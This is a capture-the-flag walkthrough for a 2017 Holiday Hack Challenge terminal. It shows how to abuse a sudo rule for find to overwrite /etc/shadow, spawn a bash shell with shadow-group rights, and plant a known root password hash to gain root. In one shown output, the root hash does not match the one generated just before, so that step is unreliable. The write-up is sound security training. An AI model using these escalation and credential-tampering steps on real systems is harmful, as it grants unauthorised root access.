* Oh Wait! Maybe WE Are...
   :PROPERTIES:
   :CUSTOM_ID: title
   :END:

** Question
   :PROPERTIES:
   :CUSTOM_ID: question
   :END:

#+BEGIN_EXAMPLE
                -->*<--
                  /o\
                 /_\_\
                /_/_0_\
               /_o_\_\_\
              /_/_/_/_/o\
             /@\_\_\@\_\_\
            /_/_/O/_/_/_/_\
           /_\_\_\_\_\o\_\_\
          /_/0/_/_/_0_/_/@/_\
         /_\_\_\_\_\_\_\_\_\_\
        /_/o/_/_/@/_/_/o/_/0/_\
       jgs       [___]  


    My name is Shinny Upatree, and I've made a big mistake.
    I fear it's worse than the time I served everyone bad hake.
    I've deleted an important file, which suppressed my server access.
    I can offer you a gift, if you can fix my ill-fated redress.

    Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
    Hint: What commands can you run with sudo?
#+END_EXAMPLE

** How to find the terminal
   :PROPERTIES:
   :CUSTOM_ID: how-to-find-the-terminal
   :END:

From this game: https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5

Direct link: https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=USER_ID

#+HTML: <iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/kVKmTwQ7nNg?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>

#+CAPTION: The terminal is just behind the starting ramp on the main platform.
[[./images/terminal-location-we_are.png]]

** Background Information
   :PROPERTIES:
   :CUSTOM_ID: background-information
   :END:

We're logged in as the user =elf=. We happen to know that
=/etc/shadow= is where *NIX systems store the password hashes for
their users.

The system MOTD gives us a hint:

#+BEGIN_QUOTE
What commands can you run with sudo?
#+END_QUOTE

We also know that =sudo= is a program that allows us to run commands with the privileges of other users and/or groups.

** Goal
   :PROPERTIES:
   :CUSTOM_ID: goal
   :END:

We need to overwrite /etc/shadow with /etc/shadow.bak. Basically we
need to ~cp /etc/shadow.bak /etc/shadow~, except that we don't have
permissions to do that directly:

#+BEGIN_SRC
elf@784e43534178:~$ cp /etc/shadow.bak /etc/shadow
cp: cannot create regular file '/etc/shadow': Permission denied
#+END_SRC

** Hints
   :PROPERTIES:
   :CUSTOM_ID: approach
   :END:

Shinny Upatree on Twitter has a few hints:

#+HTML: <blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">I think I have some pseudo (sp?) permissions on this Unix server, but I don&#39;t know what that means. <a href="https://twitter.com/GreenesterElf?ref_src=twsrc%5Etfw">@GreenesterElf</a> said this was a &quot;learning opportunity&quot; and won&#39;t give me the answer :&#39;(</p>&mdash; Shinny Upatree (@ClimbALLdaTrees) <a href="https://twitter.com/ClimbALLdaTrees/status/938578359860174848?ref_src=twsrc%5Etfw">December 7, 2017</a></blockquote>

** Approach
   :PROPERTIES:
   :CUSTOM_ID: approach
   :END:

If we follow the hint, we should try to figure out what commands we can run with sudo. Let's run ~sudo -h~ to view the help documentation:

#+BEGIN_EXAMPLE
sudo - execute a command as another user
...
  -l, --list                  list user's privileges or check a specific command; use twice for longer format
...
#+END_EXAMPLE

To follow the hint, we should run sudo with the ~--list~ option, to see what our privileges are:

#+BEGIN_SRC
elf@784e43534178:~$ sudo --list
Matching Defaults entries for elf on 784e43534178:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elf may run the following commands on 784e43534178:
    (elf : shadow) NOPASSWD: /usr/bin/find
#+END_SRC

We can run the find command, but it also mentions something about shadow. Let's give it a shot:

#+BEGIN_SRC
elf@784e43534178:~$ sudo find
[sudo] password for elf: 
#+END_SRC

We don't know the password. The sudo output said we should be able to
run this without a password ("NOPASSWD"). Something's not quite
right. We can run sudo with ~-l -l~ as the help output said to get
some more verbose output:

#+BEGIN_SRC
elf@784e43534178:~$ sudo -l -l
Matching Defaults entries for elf on 784e43534178:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elf may run the following commands on 784e43534178:
Sudoers entry:
    RunAsUsers: elf
    RunAsGroups: shadow
    Options: !authenticate
    Commands:
        /usr/bin/find
#+END_SRC

Ok. So sudo lets us run the find command as the user elf, and the group shadow. Viewing ~sudo -h~ one more time shows us that there's an option we want to set our group to =shadow=:
#+BEGIN_EXAMPLE
  -g, --group=group           run command as the specified group name or ID
#+END_EXAMPLE

#+BEGIN_SRC
elf@784e43534178:~$ sudo -g shadow find 
.
./.bashrc
./.bash_logout
./.profile
#+END_SRC

This time, sudo let us run find without prompting us for a
password. So, we know that we can run commands as the elf user, and
the shadow group. Is this enough to overwrite =/etc/shadow=?

#+BEGIN_SRC
elf@784e43534178:~$ ls -l /etc/shadow
-rw-rw---- 1 root shadow 0 Dec 15 20:00 /etc/shadow
#+END_SRC

Yes. =/etc/shadow= is owned by the root user and the shadow group, and
the group has write permissions to it. At this point, the only thing
that's left is figuring out how to use =find= in order to copy
=/etc/shadow.bak= to =/etc/shadow=. =find= has an exec option:

#+BEGIN_EXAMPLE
actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;
#+END_EXAMPLE

Let's give it a shot:
#+BEGIN_SRC
elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \;
#+END_SRC

Looks like that worked:

#+BEGIN_SRC
elf@784e43534178:~$ inspect_da_box 
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
/etc/shadow has been successfully restored!
#+END_SRC

** Solution
   :PROPERTIES:
   :CUSTOM_ID: solution
   :END:

A one-liner is:

#+BEGIN_SRC
sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \; && inspect_da_box
#+END_SRC

** Alternatives
   :PROPERTIES:
   :CUSTOM_ID: alternatives
   :END:

Instead of using =find= to directly copy the file, we can just use it to start an elevated shell:

#+BEGIN_SRC
elf@784e43534178:~$ id
uid=1000(elf) gid=1000(elf) groups=1000(elf)
elf@784e43534178:~$ sudo -g shadow find -exec bash \;
...
elf@784e43534178:~$ id
uid=1000(elf) gid=42(shadow) groups=42(shadow),1000(elf)
#+END_SRC

This shows how we can use =sudo= + =find= as a general privilege escalation mechanism.

** Common Pitfalls
   :PROPERTIES:
   :CUSTOM_ID: common-pitfalls
   :END:

=find='s exec syntax is a little weird, and a common mistake is forgetting to escape the semicolon at the end:

#+BEGIN_SRC
elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow ;
find: missing argument to `-exec'
#+END_SRC

Another issue is just the fact that sudo is often set up for user
permissions, and not group permissions, so the =-g= flag is less well
known.

** Going Further - Privilege Escalation

This is neat, but let's elevate privileges to root on this
terminal. Our approach will be to put in a modified shadow file
instead, which will have a password we know for the root user.

First, let's generate the password hash in the right format:

#+BEGIN_SRC
elf@784e43534178:~$ echo "password" | openssl passwd -1 -stdin
$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/
#+END_SRC

Now that we have a hash, we'll use sed to modify the =/etc/shadow.bak=
file to have that for root's password. Remember to be careful in
escaping special characters in the sed command line.

#+BEGIN_SRC
elf@784e43534178:~$ sed -e 's/root:\*/root:$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/' /etc/shadow.bak | tee better.shadow
root:$1$WPvxfOOK$JqDBD/DPQlpkUBOC3qTp51:17484:0:99999:7:::
daemon:*:17484:0:99999:7:::
bin:*:17484:0:99999:7:::
sys:*:17484:0:99999:7:::
sync:*:17484:0:99999:7:::
games:*:17484:0:99999:7:::
...
#+END_SRC

Now, we re-run our find command, and find that we can escalate to root with a password of ~password~:

#+BEGIN_SRC
elf@784e43534178:~$ sudo -g shadow find -exec cp better.shadow /etc/shadow \;
elf@784e43534178:~$ su
Password: 
root@784e43534178:/home/elf# id  
uid=0(root) gid=0(root) groups=0(root)
#+END_SRC
